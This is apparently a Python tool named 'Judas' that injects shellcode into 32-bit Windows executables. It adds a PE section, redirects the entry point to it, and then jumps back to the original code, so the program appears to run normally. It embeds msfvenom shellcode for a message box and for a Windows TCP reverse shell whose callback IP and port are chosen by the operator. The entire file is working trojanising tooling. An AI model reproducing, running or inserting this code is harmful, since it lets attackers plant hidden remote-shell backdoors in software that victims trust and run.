import binascii
from keystone import *
import struct
import mmap
import math
import pefile
import os
import shutil
try:
    import winreg as wr
except ImportError:
    pass
import netifaces


class Judas:
    def __init__(self, payload_type, path, section, page_size, section_size, permissions, verbose, *args, **kwargs):
        self.type = payload_type
        self.path = path
        self.section_name = section
        self.page_size = page_size
        self.section_size = section_size
        self.section_permissions = permissions
        self.pe = None
        self.verbose = verbose

        self.args = args
        self.kwargs = kwargs

        self.original_entry_point = 0
        self.new_entry_point = 0

        try:
            open(path)
        except IOError:
            print(f"Error: '{path}' not found, or could not be opened...")
            print("Quiting execution")
            exit(1)

    def add_section(self):

        if self.verbose:
            print(f"New Section Information:\n\
                \tName: {self.section_name}\n\
                \tVirtual Size: {self.page_size}\n\
                \tRaw Size: {self.section_size}\n\
                \tCharacteristics: {hex(self.section_permissions)}\n")

        exe_path = self.make_duplicate('injection')

        if self.verbose:
            print(f"Loading {exe_path} into self.pe File Module\n")

        self.pe = pefile.PE(exe_path)
        if not self.pe.FILE_HEADER.IMAGE_FILE_32BIT_MACHINE:
            print("Error: File is not a 32-bit binary.")
            self.delete_file(
                exe_path, )
            exit(1)
        if self.no_space():
            self.delete_file(exe_path)
            exit(1)

        last_section_offset = self.pe.sections[self.pe.FILE_HEADER.NumberOfSections -
                                               1].get_file_offset()

        FILE_ALIGNMENT = self.pe.OPTIONAL_HEADER.FileAlignment

        # print(f"File alignment is {FILE_ALIGNMENT}")

        raw_offset, virtual_offset, new_section_offset = self.locate_offsets()

        if self.verbose:
            print(f"Section Offsets:\n\
                \tRaw offset: {hex(raw_offset)}\n\
                \tVirtual offset: {hex(virtual_offset)}\n\
                \tSection table offset: {hex(new_section_offset)}\n")

        # ensure raw size is multiple of filealignment
        if self.page_size % FILE_ALIGNMENT != 0:
            # print(f"Raw size is not a multiple of the file alignment: {hex(FILE_ALIGNMENT)}\n")
            self.page_size = math.ceil(
                self.page_size / FILE_ALIGNMENT) * FILE_ALIGNMENT

        # Section name must be equal to 8 bytes
        if len(self.section_name) > 8:
            print("Error: Section name must be less than or equal to 8 bytes")
            self.delete_file(exe_path)
            exit(1)

        name = self.section_name + '\x00' * (8 - len(self.section_name))

        # Set the name
        self.pe.set_bytes_at_offset(new_section_offset, name.encode())
        # Set the virtual size
        self.pe.set_dword_at_offset(new_section_offset + 8, self.page_size)
        # Set the virtual offset
        self.pe.set_dword_at_offset(new_section_offset + 12, virtual_offset)
        # Set the raw size
        self.pe.set_dword_at_offset(new_section_offset + 16, self.section_size)
        # Set the raw offset
        self.pe.set_dword_at_offset(new_section_offset + 20, raw_offset)
        # Set the following fields to zero
        # PointerToRelocations, PointerToLinenumbers, NumberOfRelocations,
        # NumberOfLinenumbers
        self.pe.set_bytes_at_offset(
            new_section_offset + 24, (12 * '\x00').encode())
        # Set the characteristics
        self.pe.set_dword_at_offset(
            new_section_offset + 36, self.section_permissions)

        # Edit the value in the File and Optional headers
        self.pe.FILE_HEADER.NumberOfSections += 1
        self.pe.OPTIONAL_HEADER.SizeOfImage = self.page_size + virtual_offset

        # write changes
        self.pe.write(exe_path)

        # resize file
        self.resize(exe_path)

        print("[x] Section Added\n")

        self.path = exe_path

        # reload pe file
        self.pe = pefile.PE(self.path)

    @staticmethod
    def resize(path):
        fd = open(path, 'a+b')
        original_size = os.path.getsize(path)
        map = mmap.mmap(fd.fileno(), 0, access=mmap.ACCESS_WRITE)
        # TODO 0x2000 may not always be needed!
        map.resize(original_size + 0x2000)
        map.close()
        fd.close()

    def locate_offsets(self):

        SECTION_ALIGNMENT = self.pe.OPTIONAL_HEADER.SectionAlignment
        number_of_section = self.pe.FILE_HEADER.NumberOfSections
        last_section = number_of_section - 1

        # get offset for new section by looking at the last sections location

        raw_offset = self.pe.sections[last_section].PointerToRawData + \
            self.pe.sections[last_section].SizeOfRawData

        virtual_offset = self.pe.sections[last_section].VirtualAddress + \
            self.pe.sections[last_section].Misc_VirtualSize

        # ensure virtual offset is a multiple of sectionalignment
        if virtual_offset % SECTION_ALIGNMENT != 0:
            # print(f"Virtual offset is not a multiple of the section alignment: {hex(SECTION_ALIGNMENT)}\n")
            factor = math.ceil(virtual_offset / SECTION_ALIGNMENT)
            virtual_offset = factor * SECTION_ALIGNMENT

        SECTION_HEADER_LENGTH = 40
        number_of_section = self.pe.FILE_HEADER.NumberOfSections
        last_section_offset = self.pe.sections[number_of_section -
                                               1].get_file_offset()
        new_section_offset = last_section_offset + SECTION_HEADER_LENGTH

        return raw_offset, virtual_offset, new_section_offset

    def no_space(self):
        number_of_section = self.pe.FILE_HEADER.NumberOfSections
        last_section_offset = self.pe.sections[number_of_section -
                                               1].get_file_offset()
        for x in self.pe.get_data(last_section_offset+0x40, 0x40):
            if x != 0x0:
                print('Error: Not enough space in file!')
                return 1
        return 0

    ########

# TODO currently only works for 32 bit, 64 bit has a different packing
# scheme and opcodes

    @staticmethod
    def tohex(val, nbits):
        return hex((val + (1 << nbits)) % (1 << nbits))

    @staticmethod
    def to_ks(code, syntax=0):

        ks = Ks(KS_ARCH_X86, KS_MODE_32)
        if syntax != 0:
            ks.syntax = syntax

        encoding, _ = ks.asm(code)
        # encoding = [233, 82, 237, 245, 255]
        encoding = [hex(x)[2:] for x in encoding]
        packed_command = binascii.unhexlify(''.join(encoding))
        return packed_command

    def call_oep(self, base, displacement):

        loaded_oep = base + self.original_entry_point
        loaded_nep = base + self.new_entry_point + displacement
        jumpback = self.tohex(-loaded_nep + loaded_oep, 32)

        return self.to_ks(f'jmp {jumpback}')

    def msgbox(self, base):

        # TODO pe-bear, firefox
        # for this example we are using the message box payload
        # msfvenom -a x86 --platform windows -p windows/messagebox \
        # TEXT="Test, Test, I'm in your code :)" ICON=INFORMATION \
        # EXITFUNC=process TITLE="Testing" -f python

        messagebox = bytes(b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9"
                           b"\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08"
                           b"\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1"
                           b"\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28"
                           b"\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34"
                           b"\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84"
                           b"\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24"
                           b"\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b"
                           b"\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c"
                           b"\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e"
                           b"\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\xbb\x7e"
                           b"\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff\xff\x89"
                           b"\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64\x68"
                           b"\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56"
                           b"\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
                           b"\x24\x52\xe8\x5f\xff\xff\xff\x68\x69\x6e\x67\x58\x68"
                           b"\x54\x65\x73\x74\x31\xdb\x88\x5c\x24\x07\x89\xe3\x68"
                           b"\x3a\x29\x58\x20\x68\x6f\x64\x65\x20\x68\x75\x72\x20"
                           b"\x63\x68\x6e\x20\x79\x6f\x68\x27\x6d\x20\x69\x68\x73"
                           b"\x74\x20\x49\x68\x2c\x20\x54\x65\x68\x54\x65\x73\x74"
                           b"\x31\xc9\x88\x4c\x24\x1e\x89\xe1\x31\xd2\x6a\x40\x53"
                           b"\x51\x52\xff\xd0")

        displacement = len(messagebox)

        jmp = self.call_oep(base, displacement)

        messagebox += bytes(jmp)

        return messagebox

    def reverse_shell(self, base, lhost=None, lport=None):
        # msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp
        # LHOST=192.168.1.148 LPORT=8080 -f python

        if lhost is None:
            lhost = self.get_ip()
        if type(lport) is str:
            lport = int(lport)
        if lport is None:
            lport = 8080
        ip = self.ip_to_hex(lhost)

        port = struct.pack('!H', lport)

        shellcode = bytes(b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
                          b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
                          b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
                          b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
                          b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
                          b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
                          b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
                          b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
                          b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
                          b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
                          b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
                          b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
                          b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
                          b"\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
                          b"\xdf\xe0\xff\xd5\x97\x6a\x05\x68" + ip + b"\x68"
                          b"\x02\x00" + port + b"\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
                          b"\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
                          b"\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
                          b"\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
                          b"\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
                          b"\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"
                          b"\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x90\x56\x46\xff\x30"
                          b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"
                          b"\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
                          b"\x75\x05\xbb\x47\x13\x72\x6f")

        displacement = len(shellcode)

        jmp = self.call_oep(base,  displacement)

        shellcode += bytes(jmp)

        return shellcode

    def payload_selection(self, base):
        if self.type in 'msgbox':
            if self.verbose:
                print("Selecting Message Box Shellcode\n")
            return self.msgbox(base)
        elif self.type in 'reverse':
            if self.verbose:
                print("Selecting Windows TCP Reverse Shell Shellcode")
                for k, v in self.kwargs.items():
                    print(f"\tAdditional Argument: {k}={v}")
                for a in self.args:
                    print(f"\tAdditional Argument: {a}")
                print()
            return self.reverse_shell(base, *self.args, **self.kwargs)

    def insert_payload(self):
        path = self.make_duplicate(self.type)

        # We will first change the binaries entry point to be the newly injected
        # section this will run our injected code first
        if self.verbose:
            print(f"Modifying Entry Point\n")
        self.original_entry_point = self.pe.OPTIONAL_HEADER.AddressOfEntryPoint
        self.new_entry_point = self.pe.sections[-1].VirtualAddress
        self.pe.OPTIONAL_HEADER.AddressOfEntryPoint = self.new_entry_point

        # Now we have to actually load the payload into the binary
        # To do this we need the raw address of the injected section
        raw_offset = self.pe.sections[-1].PointerToRawData

        # Write the shellcode into the new section
        shellcode = self.payload_selection(
            self.pe.OPTIONAL_HEADER.ImageBase)

        if self.verbose:
            print(f"Writing shellcode to {hex(raw_offset)}\n")
        self.pe.set_bytes_at_offset(raw_offset, shellcode)
        self.pe.write(path)
        print("[x] Payload injected\n")

        self.delete_file(self.path)

    ########

    @staticmethod
    def get_ip():
        interface = Judas.choose_interface()
        return netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']

    @staticmethod
    def choose_interface():
        """
        Allows user to select interface based
        on system interfaces
        """
        interfaces = netifaces.interfaces()

        if os.name == 'nt':
            # allows windows machines to choose interfaces
            iface_names = ['(unknown)' for i in range(len(interfaces))]
            reg = wr.ConnectRegistry(None, wr.HKEY_LOCAL_MACHINE)
            reg_key = wr.OpenKey(
                reg, "SYSTEM\\CurrentControlSet\\Control\\Network\\{4D36E972-E325-11CE-BFC1-08002BE10318}")
            for counter, interface in enumerate(interfaces):
                try:
                    reg_subkey = wr.OpenKey(
                        reg_key, interface + r'\Connection')

                    iface_names[counter] = wr.QueryValueEx(
                        reg_subkey, 'Name')[0]
                except FileNotFoundError:
                    pass
        else:
            iface_names = interfaces

        print('Select Interface: ')

        for val, count in enumerate(iface_names):
            print(val, count)

        selection = int(input())

        return interfaces[selection]

    @staticmethod
    def ip_to_hex(ip):
        new_ip = "".join([hex(int(x))[2:].zfill(2) for x in ip.split(".")])
        return bytes.fromhex(new_ip)

    @staticmethod
    def port_to_hex(string):
        return int(string).to_bytes(2, 'big')

    def make_duplicate(self, tag=None):
        source = self.path
        if self.verbose:
            print(f"Making duplicate file for {source}")
        if tag:
            tag = "_" + tag
        else:
            tag = "_"

        split_src = source.split('.')
        split_src[-2] += tag
        dest = ".".join(split_src)
        if os.path.exists(dest):
            os.remove(dest)
        shutil.copyfile(source, dest)
        if self.verbose:
            print(f"New file has been made: {dest}\n")
        return dest

    def delete_file(self, path):
        if os.path.exists(path):
            if self.verbose:
                print("Removing intermediate file")
            os.remove(path)
